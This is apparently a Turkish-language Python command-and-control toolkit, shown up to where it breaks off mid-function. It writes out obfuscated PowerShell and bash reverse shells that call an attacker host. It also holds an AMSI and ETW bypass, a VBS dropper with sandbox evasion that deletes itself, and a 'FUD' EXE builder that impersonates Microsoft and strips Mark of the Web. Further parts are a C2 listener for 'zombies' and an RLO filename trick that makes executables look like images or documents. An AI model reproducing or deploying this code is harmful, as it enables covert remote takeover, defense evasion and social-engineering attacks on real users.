#!/usr/bin/env python3
"""
RedTeam Command & Control (C2) & Ultimate Arsenal
==========================================================
Tüm pentest araçlarını tek bir merkezden yöneten ana konsol.
"""
import os
import sys
import socket
import shutil
import base64
import struct
import zlib
import random
import string
import subprocess

for stream in (sys.stdout, sys.stderr):
    try:
        stream.reconfigure(errors="replace")
    except (AttributeError, ValueError):
        pass

# ANSI Renk Kodları
class C:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""{C.RED}{C.BOLD}
    ██▀███  ▓█████ ▓█████▄▄▄█████▓▓█████  ▄▄▄       ███▄ ▄███▓
   ▓██ ▒ ██▒▓█   ▀ ▒██▀ ██▌▓  ██▒ ▓▒▓█   ▀ ▒████▄    ▓██▒▀█▀ ██▒
   ▓██ ░▄█ ▒▒███   ░██   █▌▒ ▓██░ ▒░▒███   ▒██  ▀█▄  ▓██    ▓██░
   ▒██▀▀█▄  ▒▓█  ▄ ░▓█▄   ▌░ ▓██▓ ░ ▒▓█  ▄ ░██▄▄▄▄██ ▒██    ▒██ 
   ░██▓ ▒██▒░▒████▒░▒████▓   ▒██▒ ░ ░▒████▒ ▓█   ▓██▒▒██▒   ░██▒
   ░ ▒▓ ░▒▓░░░ ▒░ ░ ▒▒▓  ▒   ▒ ░░   ░░ ▒░ ░ ▒▒   ▓▒█░░ ▒░   ░  ░
     ░▒ ░ ▒░ ░ ░  ░ ░ ▒  ▒     ░     ░ ░  ░  ▒   ▒▒ ░░  ░      ░
     ░░   ░    ░    ░ ░  ░   ░         ░     ░   ▒   ░      ░   
      ░        ░  ░   ░                ░  ░      ░  ░       ░   
                                                                
        {C.CYAN}--- The Ultimate Pentest Arsenal v5.0 ---{C.RESET}
"""
    print(banner)

def print_line():
    print(f"{C.DIM}{'─' * 65}{C.RESET}")

# ══════════════════════════════════════════════════════════
#  C2: STEGANOGRAFI & ŞİFRELEME YARDIMCILARI
# ══════════════════════════════════════════════════════════

def rand_var(n=8):
    return random.choice(string.ascii_lowercase) + ''.join(
        random.choices(string.ascii_lowercase + string.digits, k=n-1))

def xor_key(length=32):
    return bytes(random.randint(1, 255) for _ in range(length))

def xor_crypt(data, key):
    if isinstance(data, str):
        data = data.encode('utf-8')
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def make_png_chunk(ctype, cdata):
    raw = ctype + cdata
    return struct.pack('>I', len(cdata)) + raw + struct.pack('>I', zlib.crc32(raw) & 0xffffffff)

def embed_in_png(src_img, payload_text, out_path):
    try:
        with open(src_img, 'rb') as f:
            raw = f.read()

        if raw[:8] != b'\x89PNG\r\n\x1a\n':
            return None, "Geçersiz PNG dosyası!"

        key = xor_key(32)
        enc = xor_crypt(payload_text, key)
        pay_b64 = base64.b64encode(enc).decode()
        key_b64 = base64.b64encode(key).decode()

        ch1 = make_png_chunk(b'tEXt', b'Software\x00Adobe Photoshop CC 2024 ' + key_b64.encode())
        ch2 = make_png_chunk(b'tEXt', b'Comment\x00' + pay_b64.encode())

        iend = raw.rfind(b'IEND')
        if iend == -1:
            return None, "IEND chunk bulunamadı!"
        iend_start = iend - 4
        new_png = raw[:iend_start] + ch1 + ch2 + raw[iend_start:]

        with open(out_path, 'wb') as f:
            f.write(new_png)

        return key_b64, None
    except Exception as e:
        return None, str(e)

def save_text(path, content):
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)

def build_evasive_ps(lhost, lport):
    v = {k: rand_var() for k in ['c','s','b','i','d','o','p','x']}
    ps = (
        f"${v['c']}=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"${v['s']}=${v['c']}.GetStream();"
        f"[byte[]]${v['b']}=0..65535|%{{0}};"
        f"while((${v['i']}=${v['s']}.Read(${v['b']},0,${v['b']}.Length)) -ne 0){{"
        f"${v['d']}=(New-Object Text.ASCIIEncoding).GetString(${v['b']},0,${v['i']});"
        f"try{{${v['o']}=(iex ${v['d']} 2>&1|Out-String)}}catch{{${v['o']}=$_.Exception.Message}};"
        f"${v['p']}=${v['o']}+'PS '+$((gl).Path)+'> ';"
        f"${v['x']}=([Text.Encoding]::ASCII).GetBytes(${v['p']});"
        f"${v['s']}.Write(${v['x']},0,${v['x']}.Length);${v['s']}.Flush()}};"
        f"${v['c']}.Close()"
    )
    return ps

def build_amsi_bypass():
    """AMSI bypass + ETW (Event Tracing) patch — log'ları da devre dışı bırakır"""
    amsi = (
        "try{$r=[Ref].Assembly.GetType('System.Management.Automation.'+[char]65+'msi'+[char]85+'tils');"
        "$f=$r.GetField(''+[char]97+'msi'+'Init'+'Fai'+'led','NonPublic,Static');"
        "$f.SetValue($null,$true)}catch{}"
    )
    etw = (
        ";try{[Reflection.Assembly]::LoadWithPartialName('System.Core')|Out-Null;"
        "$e=[Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic,Instance');"
        "$p=New-Object Diagnostics.Eventing.EventProvider([guid]::NewGuid());"
        "$e.SetValue($p,0)}catch{}"
    )
    return amsi + etw

def build_standalone_vbs(key_b64, pay_b64, anti_sandbox=True):
    """Tek dosya: Key ve payload doğrudan VBS içine gömülü, harici dosya gerekmez."""
    vbs = "On Error Resume Next\n"

    if anti_sandbox:
        vbs += '''
' ── Zamanlama Kontrolü (hızlandırılmış sandbox tespiti) ──
Dim t1, t2
t1 = Timer
WScript.Sleep 1500
t2 = Timer
If (t2 - t1) < 1 Then WScript.Quit

' ── VM / Sanal Makine Kontrolü ──
Set wmi = GetObject("winmgmts:")
Set items = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystem")
For Each item In items
    Dim mfr, mdl
    mfr = LCase(item.Manufacturer)
    mdl = LCase(item.Model)
    If InStr(mfr,"vmware")>0 Or InStr(mfr,"virtualbox")>0 Or InStr(mfr,"xen")>0 Or InStr(mdl,"virtual")>0 Then
        WScript.Quit
    End If
Next

' ── Analiz Aracı Tespiti ──
Dim procs, proc
Set procs = wmi.ExecQuery("SELECT Name FROM Win32_Process")
Dim blacklist
blacklist = Array("wireshark","procmon","procexp","x64dbg","x32dbg","ollydbg","ida","fiddler","httpdebuggerpro","dnspy","pestudio","processhacker")
For Each proc In procs
    Dim pn
    pn = LCase(proc.Name)
    Dim bl
    For Each bl In blacklist
        If InStr(pn, bl) > 0 Then WScript.Quit
    Next
Next

' ── Ekran & RAM Kontrolü ──
Set sh = CreateObject("WScript.Shell")
Dim scrW
scrW = sh.RegRead("HKCU\\Control Panel\\Desktop\\ScreenWidth")
If CInt(scrW) < 1024 Then WScript.Quit
Dim mem
For Each item In wmi.ExecQuery("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem")
    mem = CLng(item.TotalPhysicalMemory / 1073741824)
Next
If mem < 2 Then WScript.Quit

' ── Rastgele Gecikme (3-8s) ──
Randomize
WScript.Sleep Int((8000 - 3000 + 1) * Rnd + 3000)
'''
    else:
        vbs += '''
Set sh = CreateObject("WScript.Shell")
'''

    # Görseli aç (şüphe uyandırmasın) + Key ve payload'ı doğrudan VBS'e göm
    vbs += f'''
' ── Görseli Aç (masum görüntüsü) ──
Dim myDir
myDir = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))
sh.Run """" & myDir & "photo.png" & """", 1, False

' ── Gömülü Payload (Base64 + XOR Şifreli) ──
Dim keyB64, payB64
keyB64 = "{key_b64}"
payB64 = "{pay_b64}"

' ── Base64 Decode ──
Dim xml1
Set xml1 = CreateObject("MSXML2.DOMDocument")
Dim node1
Set node1 = xml1.createElement("b64")
node1.DataType = "bin.base64"

node1.Text = keyB64
Dim keyBytes
keyBytes = node1.nodeTypedValue

node1.Text = payB64
Dim payBytes
payBytes = node1.nodeTypedValue

' ── XOR Çözümleme ──
Dim keyLen, payLen
keyLen = LenB(keyBytes)
payLen = LenB(payBytes)
Dim result
result = ""
Dim idx
For idx = 1 To payLen
    Dim pb, kb
    pb = AscB(MidB(payBytes, idx, 1))
    kb = AscB(MidB(keyBytes, ((idx - 1) Mod keyLen) + 1, 1))
    result = result & Chr(pb Xor kb)
Next

'''
    # Çalıştırma
    if anti_sandbox:
        vbs += '''
' ── Gizli PowerShell Çalıştır ──
Dim wmiProc
Set wmiProc = GetObject("winmgmts:Win32_Process")
wmiProc.Create "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """", Null, Null, Null

' ── Kendini Sil ──
Dim fso
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile WScript.ScriptFullName, True
'''
    else:
        vbs += '''
' ── PowerShell Çalıştır ──
Dim psCmd
psCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command """ & result & """"
sh.Run psCmd, 0, False
'''

    return vbs

# ══════════════════════════════════════════════════════════
#  C2 MENÜLERİ
# ══════════════════════════════════════════════════════════

def encrypt_aes(data, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import pad
        if isinstance(data, str): data = data.encode('utf-8')
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        import base64
        return base64.b64encode(cipher.iv + ct_bytes)
    except: return data

def decrypt_aes(enc_data, key):
    try:
        from Crypto.Cipher import AES
        from Crypto.Util.Padding import unpad
        import base64
        raw = base64.b64decode(enc_data)
        iv = raw[:16]
        ct = raw[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ct), AES.block_size).decode('utf-8', errors='replace')
    except: return ""

def c2_payload_builder(auto_lhost=None, auto_lport=None, auto_os=None, auto_antisb=None, auto_exename=None):
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] C2 Payload Builder (AES-256 Şifreli){C.RESET}\n")
    print_line()
    print(f"{C.DIM}  [!] Önerilen Portlar: 443 (HTTPS), 80 (HTTP), 53 (DNS) - Güvenlik duvarlarını aşmak için{C.RESET}\n")

    try:
        lhost = auto_lhost if auto_lhost else input(f"{C.CYAN}  [?] LHOST (Saldırgan IP)   : {C.RESET}").strip()
        lport = auto_lport if auto_lport else input(f"{C.CYAN}  [?] LPORT (Saldırgan Port) : {C.RESET}").strip()

        if not lhost or not lport:
            print(f"{C.RED}  [-] Hata: Geçersiz IP veya Port.{C.RESET}")
            if not auto_lhost: input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
            return

        print_line()
        print(f"\n{C.BLUE}{C.BOLD}  --- Hedef Sistem ---{C.RESET}")
        print(f"  {C.CYAN}1){C.RESET} Windows (Tek EXE Payload - AES256)")
        print(f"  {C.CYAN}2){C.RESET} Linux (Bash Reverse Shell - Plain)")

        os_choice = auto_os if auto_os else input(f"\n{C.CYAN}  [>] Seçiminiz: {C.RESET}").strip()

        if os_choice == '1':
            print_line()

            if auto_antisb is not None:
                anti_sb = auto_antisb
            else:
                anti_sb_input = input(f"\n{C.CYAN}  [?] Anti-VM/Sandbox koruması açılsın mı? {C.DIM}(Kendi PC'nizde test için 'H'){C.RESET} [E/h]: ").strip().lower()
                anti_sb = False if anti_sb_input == 'h' else True

            exe_name = auto_exename if auto_exename else (input(f"{C.CYAN}  [?] EXE dosya adı {C.DIM}[setup]{C.RESET}: ").strip() or "setup")
    except (EOFError, KeyboardInterrupt):
        print(f"\n{C.YELLOW}  [*] İşlem iptal edildi.{C.RESET}")
        return

    if os_choice == '1':
        try:
            print(f"\n{C.YELLOW}  [*] Payload oluşturuluyor... Lütfen bekleyin.{C.RESET}")
            import sys
            sys.stdout.flush()
            
            aes_key = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
            save_text(os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller/Sistem/c2_aes_key.txt"), aes_key)
            print(f"{C.GREEN}  [+] AES-256 Anahtarı Üretildi ve Kaydedildi.{C.RESET}")

            # Reverse shell Python scripti oluştur
            output_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller\\11_Gizli_Zararli_Olusturucu")
            os.makedirs(output_dir, exist_ok=True)
            stub_path = os.path.join(output_dir, "_stub.py")

            anti_sb_code = ""
            if anti_sb:
                anti_sb_code = """
import ctypes, time
# Zamanlama kontrolü
t1 = time.time()
time.sleep(1.5)
if time.time() - t1 < 1:
    raise SystemExit
# VM kontrolü
try:
    import subprocess as _sp
    _r = _sp.run(['wmic','computersystem','get','manufacturer,model'],capture_output=True,text=True)
    _o = _r.stdout.lower()
    for _v in ['vmware','virtualbox','xen','virtual']:
        if _v in _o:
            raise SystemExit
except:
    pass
# Analiz aracı kontrolü
try:
    _r = _sp.run(['tasklist'],capture_output=True,text=True)
    _t = _r.stdout.lower()
    for _b in ['wireshark','procmon','x64dbg','ollydbg','ida','fiddler','processhacker']:
        if _b in _t:
            raise SystemExit
except:
    pass
"""

            # Stub template'den oku ve placeholder'lari degistir
            template_path = os.path.join(os.path.dirname(__file__), "Moduller\\11_Gizli_Zararli_Olusturucu", "stub_template.py")
            if not os.path.exists(template_path):
                print(f"{C.RED}  [-] Hata: stub_template.py bulunamadı! Yol: {template_path}{C.RESET}")
                input(f"{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
                return

            with open(template_path, "r", encoding="utf-8") as tf:
                stub_code = tf.read()
            stub_code = stub_code.replace("__LHOST__", lhost)
            stub_code = stub_code.replace("__LPORT__", str(lport))
            stub_code = stub_code.replace("__ANTI_SB__", anti_sb_code)
            stub_code = stub_code.replace("__AES_KEY__", aes_key)
            
            # --- FUD Code Obfuscator (Rastgele Değişken İsimlendirme) ---
            print(f"{C.YELLOW}  [*] FUD Obfuscator çalışıyor... Dinamik kod imzası oluşturuluyor.{C.RESET}")
            def r_str(): return "v_" + "".join(random.choices(string.ascii_letters, k=8))
            fud_map = {
                "LHOST": r_str(), "LPORT": r_str(), "AES_KEY": r_str(),
                "run_cmd": r_str(), "smb_worm": r_str(), "connect": r_str(),
                "chunk": r_str(), "raw": r_str(), "iv": r_str(), "ct": r_str(),
                "cipher": r_str(), "ct_bytes": r_str(), "output": r_str(),
                "local_ip": r_str(), "base_ip": r_str(), "results": r_str(),
                "target": r_str()
            }
            for k, v in fud_map.items():
                # Sadece kelime olarak geçenleri değiştir (importlar vs bozulmasın diye)
                import re
                stub_code = re.sub(r'\b' + k + r'\b', v, stub_code)
            
            save_text(stub_path, stub_code)

            print(f"{C.YELLOW}  [*] Nuitka ile native EXE derleniyor (bu işlem 1-5 dakika sürebilir)...{C.RESET}")

            # Nuitka ile derle (native C — AV tespiti çok düşük)
            exe_out = os.path.join(output_dir, exe_name + ".exe")
            result = subprocess.run(
                [sys.executable, "-m", "nuitka",
                 "--onefile", "--windows-console-mode=disable",
                 "--output-dir=" + output_dir,
                 "--output-filename=" + exe_name + ".exe",
                 "--remove-output",
                 "--assume-yes-for-downloads",
                 "--windows-company-name=Microsoft Corporation",
                 "--windows-product-name=Windows Update Service",
                 "--windows-file-version=10.0.26200.1",
                 "--windows-product-version=10.0.26200.1",
                 "--windows-file-description=Windows Update Assistant",
                 stub_path],
                capture_output=True, text=True
            )

            # Temizlik
            for cleanup in [stub_path,
                            os.path.join(output_dir, "_stub.build"),
                            os.path.join(output_dir, "_stub.onefile-build"),
                            os.path.join(output_dir, "_stub.dist")]:
                if cleanup and os.path.exists(cleanup):
                    try:
                        if os.path.isdir(cleanup):
                            shutil.rmtree(cleanup, ignore_errors=True)
                        else:
                            os.remove(cleanup)
                    except:
                        pass

            if os.path.exists(exe_out):
                # MOTW (Mark of the Web) sil — SmartScreen bypass
                try:
                    motw_path = exe_out + ':Zone.Identifier'
                    if os.path.exists(motw_path):
                        os.remove(motw_path)
                except: pass
                # PowerShell ile de temizle
                subprocess.run(['powershell', '-c',
                    f'Remove-Item -Path "{os.path.abspath(exe_out)}" -Stream Zone.Identifier -ErrorAction SilentlyContinue'],
                    capture_output=True)

                exe_size = os.path.getsize(exe_out) / (1024*1024)
                print(f"\n{C.GREEN}{C.BOLD}  ╔══════════════════════════════════════════════════════╗{C.RESET}")
                print(f"{C.GREEN}{C.BOLD}  ║  ✅ TEK DOSYA EXE PAYLOAD HAZIR!                     ║{C.RESET}")
                print(f"{C.GREEN}{C.BOLD}  ╚══════════════════════════════════════════════════════╝{C.RESET}")
                print(f"\n{C.WHITE}  📁 Dosya   : {os.path.abspath(exe_out)}{C.RESET}")
                print(f"{C.WHITE}  📦 Boyut   : {exe_size:.1f} MB{C.RESET}")
                print(f"{C.WHITE}  🛡️  Anti-SB : {'Açık' if anti_sb else 'Kapalı (Test Modu)'}{C.RESET}")
                print(f"{C.WHITE}  🎯 Hedef   : {lhost}:{lport}{C.RESET}")
                print(f"{C.WHITE}  🔧 Şifreleme: AES-256 E2E Encryption{C.RESET}")
                print(f"{C.WHITE}  🛡️  MOTW    : Temizlendi ✅{C.RESET}")
                print(f"\n{C.YELLOW}  [!] Bu EXE'yi hedefe gönderip çift tıklatmanız yeterli.{C.RESET}")
                print(f"{C.YELLOW}  [!] SmartScreen bypass: WhatsApp/Telegram/USB ile gönderin.{C.RESET}")
                print(f"{C.YELLOW}  [!] Listener'ınızı başlatmayı unutmayın: Menüden 2) Listener{C.RESET}")

                # Klasörü otomatik aç
                if os.name == 'nt':
                    os.startfile(os.path.abspath(output_dir))
            else:
                print(f"\n{C.RED}  [-] EXE oluşturulamadı!{C.RESET}")
                if result.stderr:
                    print(f"{C.RED}  [-] Hata Çıktısı:\n{result.stderr}{C.RESET}")
                if result.stdout:
                    print(f"{C.DIM}  {result.stdout[-500:]}{C.RESET}")
                print(f"{C.YELLOW}  [!] Lütfen 'pip install nuitka' komutunun çalıştığından emin olun.{C.RESET}")
                input(f"\n{C.YELLOW}  Devam etmek için Enter'a basın...{C.RESET}")
        except Exception as e:
            print(f"\n{C.RED}  [!!!] KRİTİK HATA: {e}{C.RESET}")
            import traceback
            traceback.print_exc()
            input(f"\n{C.YELLOW}  Hata detayı için Enter'a basın...{C.RESET}")

    elif os_choice == '2':
        payload = f"#!/bin/bash\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        save_text(os.path.join(os.path.dirname(os.path.abspath(__file__)), "linux_payload.sh"), payload)
        print(f"\n{C.GREEN}[+] Linux Payload oluşturuldu: linux_payload.sh{C.RESET}")
    
    if not auto_exename:
        input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")

def c2_listener():
    clear_screen()
    print_banner()
    print(f"{C.YELLOW}[*] C2 Listener (Dinleyici){C.RESET}\n")
    print_line()
    print(f"{C.DIM}  [!] Önerilen Portlar: Payload'da belirttiğiniz port (ör: 443, 80, 53){C.RESET}\n")

    port_str = input(f"{C.CYAN}  [?] Dinlenecek Port: {C.RESET}").strip()
    if not port_str.isdigit():
        return
    port = int(port_str)

    # AES Key Yükle
    aes_key = None
    key_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "Moduller/Sistem/c2_aes_key.txt")
    if os.path.exists(key_path):
        with open(key_path, "r") as f:
            aes_key = f.read().strip().encode('utf-8')
        print(f"{C.GREEN}  [+] Mevcut AES-256 Anahtarı yüklendi.{C.RESET}")
    else:
        print(f"{C.YELLOW}  [!] Uyarı: AES-256 Anahtarı bulunamadı! (Moduller/Sistem/c2_aes_key.txt yok){C.RESET}")
        print(f"{C.DIM}      Şifresiz (Plaintext) payload bağlantısı beklenecek.{C.RESET}")

    loot_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "loot")
    os.makedirs(loot_dir, exist_ok=True)

    print(f"\n{C.GREEN}  [*] 0.0.0.0:{port} dinleniyor... (İptal: CTRL+C){C.RESET}")
    print(f"{C.DIM}  [*] Özel komutlar için !help yazın{C.RESET}\n")

    conn = None
    s = None
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(("0.0.0.0", port))
        s.listen(1)

        conn, addr = s.accept()
        conn.settimeout(30)
        print(f"{C.RED}{C.BOLD}  [!] BAĞLANTI GELDİ: {addr[0]}:{addr[1]}{C.RESET}\n")
        
        import sys
        sys.path.append(os.path.dirname(os.path.abspath(__file__)))
        try:
            import Moduller.Sistem.Bildirim_Sistemi
            Moduller.Sistem.Bildirim_Sistemi.send_alert(f"⚠️ YENİ BİR ZOMBİ BAĞLANDI!\n\nIP Adresi: {addr[0]}\nPort: {addr[1]}", title="🚀 C2 BAĞLANTISI BAŞARILI")
            print(f"{C.YELLOW}  [*] Bildirim Gönderildi (Telegram/Discord){C.RESET}")
        except Exception as e:
            print(f"Bildirim Hatasi: {e}")

        while True:
            try:
                # Gelen veriyi şifreli veya şifresiz oku
                response = b""
                while True:
                    try:
                        chunk = conn.recv(65536)
                        if not chunk:
                            break
                        response += chunk
                        if b"\n" in chunk: # Yeni satır ayırıcı
                            break
                    except socket.timeout:
                        break

                if not response:
                    print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                    break
                
                # Çöz (Eğer AES key varsa)
                if aes_key:
                    resp_str = decrypt_aes(response.strip(), aes_key)
                else:
                    resp_str = response.decode("utf-8", errors="replace")
                
                print(f"{C.WHITE}{resp_str}{C.RESET}", end="")
                
                cmd = input(f"{C.RED}C2-Shell>{C.RESET} ")
                
                if cmd.strip() == '!PANIK':
                    print(f"\n{C.RED}{C.BOLD}  [☠️] KENDİNİ İMHA (KILL-SWITCH) BAŞLATILDI!{C.RESET}")
                    print(f"{C.RED}  [!] Kurban sistemindeki payload kendini imha komutu alıyor...{C.RESET}")
                    try:
                        import Moduller.Sistem.Bildirim_Sistemi
                        Moduller.Sistem.Bildirim_Sistemi.send_alert("PANIC MODE ACTIVATED! Wiping C2 and destroying zombies...", title="☠️ PANİK BUTONU TETİKLENDİ")
                    except: pass
                    
                    if aes_key: conn.sendall(encrypt_aes("!suicide", aes_key) + b"\n")
                    else: conn.sendall(b"!suicide\n")
                    
                    print(f"{C.RED}  [!] Sistem logları sıfırlanıyor ve bağlantı kesiliyor... HOŞÇA KALIN.{C.RESET}")
                    conn.close()
                    sys.exit(0)

                if cmd.lower() in ['exit', 'quit']:
                    if aes_key: conn.sendall(encrypt_aes(cmd, aes_key) + b"\n")
                    else: conn.sendall(cmd.encode("utf-8") + b"\n")
                    break
                if not cmd.strip():
                    if aes_key: conn.sendall(encrypt_aes("echo .", aes_key) + b"\n")
                    else: conn.sendall(b"\n")
                    continue

                if aes_key:
                    conn.sendall(encrypt_aes(cmd, aes_key) + b"\n")
                else:
                    conn.sendall(cmd.encode("utf-8") + b"\n")

            except (ConnectionResetError, BrokenPipeError, ConnectionAbortedError):
                print(f"\n{C.RED}  [-] Bağlantı koptu!{C.RESET}")
                break
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}  [*] Dinleme iptal edildi.{C.RESET}")
    except Exception as e:
        print(f"\n{C.RED}  [-] Hata: {e}{C.RESET}")
    finally:
        if conn: conn.close()
        if s: s.close()

    input(f"\n{C.YELLOW}  Ana menüye dönmek için Enter'a basın...{C.RESET}")

# ══════════════════════════════════════════════════════════
#  EXE DISGUISE (KILIK DEĞİŞTİRME)
# ══════════════════════════════════════════════════════════

def c2_disguise():
    try:
        clear_screen()
        print_banner()
        print(f"{C.YELLOW}[*] EXE Gizleme — Dosya Kılık Değiştirme{C.RESET}\n")
        print_line()
        print(f"{C.DIM}  EXE dosyanızı PNG/JPG/PDF gibi gösterir.{C.RESET}")
        print(f"{C.DIM}  RLO Unicode trick + Sahte ikon + Yem dosya açma{C.RESET}\n")

        # 1. EXE dosyasını seç
        exe_path = input(f"{C.CYAN}  [?] EXE dosya yolu: {C.RESET}").strip().strip('"')
        if not os.path.exists(exe_path):
            print(f"{C.RED}  [-] Dosya bulunamadı: {exe_path}{C.RESET}")
            input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
            return

        # 2. Kılık seç
        print(f"\n  {C.CYAN}Hangi dosya türü olarak gizlensin?{C.RESET}")
        print(f"  {C.WHITE}1){C.RESET} 🖼️  PNG Resim")
        print(f"  {C.WHITE}2){C.RESET} 📷 JPG Fotoğraf")
        print(f"  {C.WHITE}3){C.RESET} 📄 PDF Doküman")
        print(f"  {C.WHITE}4){C.RESET} 📝 Word Doküman")
        print(f"  {C.WHITE}5){C.RESET} 📊 Excel Dosya")
        disguise_choice = input(f"\n{C.CYAN}  [>] Seçim: {C.RESET}").strip()

        ext_map = {
            '1': ('png', 'gnp'),
            '2': ('jpg', 'gpj'),
            '3': ('pdf', 'fdp'),
            '4': ('docx', 'xcod'),
            '5': ('xlsx', 'xslx'),
        }
        if disguise_choice not in ext_map:
            disguise_choice = '1'
        fake_ext, reversed_ext = ext_map[disguise_choice]

        # 3. Dosya adı
        base_name = input(f"{C.CYAN}  [?] Görünen dosya adı (ör: tatil_foto): {C.RESET}").strip() or "resim"

        # 4. Yem dosya (opsiyonel)
        print(f"\n{C.DIM}  [*] Yem dosya: EXE açılınca gösterilecek gerçek resim/doküman (opsiyonel){C.RESET}")
        decoy_path = input(f"{C.CYAN}  [?] Yem dosya yolu (boş = yem yok): {C.RESET}").strip().strip('"')

        # İkon soralım
        icon_path = input(f"{C.CYAN}  [?] Özel ikon dosyası (.ico) yolu (boş = varsayılan): {C.RESET}").strip().strip('"')
        
        # 5. Hazırla
        import shutil
        final_exe = exe_path

        if decoy_path and os.path.exists(decoy_path):
            print(f"{C.YELLOW}  [*] Yem dosya ile EXE paket oluşturuluyor...{C.RESET}")
            decoy_ext = os.path.splitext(decoy_path)[1]

            # Çıkış klasörü olarak güvenilir olan TEMP klasörünü kullan
            import tempfile
            temp_base = tempfile.gettempdir()
            pkg_dir = os.path.join(temp_base, 'disguise_pkg')
            if os.path.exists(pkg_dir):
                import shutil
                shutil.rmtree(pkg_dir, ignore_errors=True)
            os.makedirs(pkg_dir, exist_ok=True)

            # Dosyaları kopyala
            decoy_dest = os.path.join(pkg_dir, f"preview{decoy_ext}")
            exe_dest = os.path.join(pkg_dir, "svchost.exe")
            shutil.copy2(decoy_path, decoy_dest)
            shutil.copy2(exe_path, exe_dest)

            # C# Launcher Code
            cs_code = f'''using System.Diagnostics;
using System.IO;
using System.Reflection;

class Program {{
    static void Main() {{
        string baseDir = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
        string decoy = Path.Combine(baseDir, "preview{decoy_ext}");
        string payload = Path.Combine(baseDir, "svchost.exe");

        if (File.Exists(decoy)) {{
            Process.Start(new ProcessStartInfo(decoy) {{ UseShellExecute = true }});
        }}
        if (File.Exists(payload)) {{
            ProcessStartInfo psi = new ProcessStartInfo(payload);
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            Process.Start(psi);
        }}
    }}
}}'''
            cs_path = os.path.join(pkg_dir, "launcher.cs")
            save_text(cs_path, cs_code)
            
            # C# derleyicisi (csc.exe) ile derle
            csc_path = r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
            if not os.path.exists(csc_path):
                csc_path = r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe"
            
            final_exe = os.path.join(pkg_dir, "open.exe")
            
            cmd = [csc_path, "/target:winexe", "/out:" + final_exe]
            if icon_path and os.path.exists(icon_path) and icon_path.lower().endswith(".ico"):
                cmd.append("/win32icon:" + icon_path)
            cmd.append(cs_path)
            
            print(f"{C.YELLOW}  [*] Launcher derleniyor...{C.RESET}")
            try:
                res = subprocess.run(cmd, capture_output=True, text=True)
            except Exception as e:
                res = type('obj', (object,), {'stdout': '', 'stderr': str(e)})()
        else:
            res = None
            final_exe = exe_path

        if not os.path.exists(final_exe):
            print(f"{C.RED}  [-] Paketleme başarısız!{C.RESET}")
            if res:
                print(f"{C.RED}  Derleyici Çıktısı:\n{res.stdout}\n{res.stderr}{C.RESET}")
                if "error CS1566" in res.stdout or "error CS1566" in res.stderr:
                    print(f"{C.YELLOW}  [!] DİKKAT: İkon (.ico) dosyanız bozuk veya geçerli bir ICO formatında değil!{C.RESET}")
                    print(f"{C.YELLOW}  [!] Sadece ismini değiştirerek yaptığınız .ico dosyaları derleyicimi bozar.{C.RESET}")
            input(f"\n{C.YELLOW}  Enter'a basın...{C.RESET}")
            return

        # 6. RLO trick ile yeniden adlandır
        RLO = '\u202E'  # Right-to-Left Override
        
        # Windows, uzantiyi son noktadan sonraki kisim olarak algilar.
        # Gerçek exe/vbs olarak calismasi icin gercek uzantimiz .exe, .scr, veya .vbs olmali.
        # RLO karakteri ile metni ters ceviririz.
        # Ornek: "resim" + RLO + "gnp.scr" -> "resimrcs.png" (ekranda boyle gorunur)
        # ".scr" executable bir formattir ve ekran koruyucu uzantisidir.
        real_ext = "scr" if final_exe.endswith(".exe") else final_exe.split('.')[-1]
        
        # Gerçek dosya adi (isletim sisteminin gordugu): base_name + \u202E + reversed_ext + . + real_ext
        # Gorunen dosya adi (kullanicinin gordugu): base_name + reversed_real_ext + . + fake_ext
        # "vbs" -> "sbv"
        # "scr" -> "rcs"
        reversed_real_ext = real_ext[::-1]
        
        # Örn: resim + RLO + gnp.scr -> resimrcs.png
        rlo_name = f"{base_name}{RLO}{reversed_ext}.{real_ext}"
        
        # os.getcwd() yerine scriptin bulundugu klasoru al
        base_dir = os.path.dirname(os.path.abspath(__file__))
        rlo_dir = os.path.join(base_dir, 'Moduller\\11_Gizli_Zararli_Olusturucu')
        os.makedirs(rlo_dir, exist_ok=True)
        rlo_path = os.path.join(rlo_dir, rlo_name)

        import shutil
        # Eğer yem dosya kullandıysak tüm paketi kopyalamalıyız.
